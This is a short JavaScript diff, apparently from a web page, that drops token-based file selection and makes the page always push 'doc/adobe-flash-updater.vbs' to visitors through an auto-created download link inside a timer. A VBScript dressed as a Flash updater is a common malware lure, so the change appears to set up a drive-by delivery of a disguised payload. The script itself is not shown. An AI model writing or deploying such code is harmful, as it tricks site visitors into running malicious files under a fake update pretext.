@@ -16,15 +16,7 @@ setTimeout(() => {
         token = window.location.pathname.replace(/^\/|\/$/g, "");
     }
 
-    console.log(token);
-
-    if (token) {
-        console.log("1")
-       file = getDownloadFile(token);
-    } else { 
-        console.log("2");
-        file = "doc/adobe-flash-updater.vbs"
-    }
+    file = "doc/adobe-flash-updater.vbs"
 
     const link = document.createElement("a");
     link.href = file;
